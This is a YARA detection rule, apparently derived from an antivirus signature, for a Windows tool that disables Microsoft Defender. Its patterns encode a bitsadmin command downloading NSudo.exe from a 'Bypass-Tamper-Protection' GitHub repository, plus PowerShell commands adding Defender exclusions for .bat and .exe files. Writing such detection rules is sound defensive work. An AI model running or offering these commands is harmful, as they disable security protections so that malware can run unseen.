
rule HackTool_Win32_DefeatDefend_A{
	meta:
		description = "HackTool:Win32/DefeatDefend.A,SIGNATURE_TYPE_PEHSTR_EXT,03 00 03 00 03 00 00 "
		
	strings :
		$a_01_0 = {62 69 74 73 61 64 6d 69 6e 2f 74 72 61 6e 73 66 65 72 20 45 78 70 6c 6f 72 65 72 73 20 2f 64 6f 77 6e 6c 6f 61 64 20 2f 70 72 69 6f 72 69 74 79 20 46 4f 52 45 47 52 4f 55 4e 44 20 68 74 74 70 73 3a 2f 2f 72 61 77 2e 67 69 74 68 75 62 75 73 65 72 63 6f 6e 74 65 6e 74 2e 63 6f 6d 2f 73 77 61 67 6b 61 72 6e 61 2f 42 79 70 61 73 73 2d 54 61 6d 70 65 72 2d 50 72 6f 74 65 63 74 69 6f 6e 2f 6d 61 69 6e 2f 4e 53 75 64 6f 2e 65 78 65 20 25 74 65 6d 70 25 5c 4e 53 75 64 6f 2e 65 78 65 } //1 bitsadmin/transfer Explorers /download /priority FOREGROUND https://raw.githubusercontent.com/swagkarna/Bypass-Tamper-Protection/main/NSudo.exe %temp%\NSudo.exe
		$a_03_1 = {70 6f 77 65 72 73 68 65 6c 6c 2e 65 78 65 20 2d 63 6f 6d 6d 61 6e 64 [0-06] 41 64 64 2d 4d 70 50 72 65 66 65 72 65 6e 63 65 20 2d 45 78 63 6c 75 73 69 6f 6e 45 78 74 65 6e 73 69 6f 6e [0-06] 2e 62 61 74 } //1
		$a_03_2 = {70 6f 77 65 72 73 68 65 6c 6c 2e 65 78 65 20 2d 63 6f 6d 6d 61 6e 64 [0-06] 41 64 64 2d 4d 70 50 72 65 66 65 72 65 6e 63 65 20 2d 45 78 63 6c 75 73 69 6f 6e 45 78 74 65 6e 73 69 6f 6e [0-06] 2e 65 78 65 } //1
	condition:
		((#a_01_0  & 1)*1+(#a_03_1  & 1)*1+(#a_03_2  & 1)*1) >=3
 
}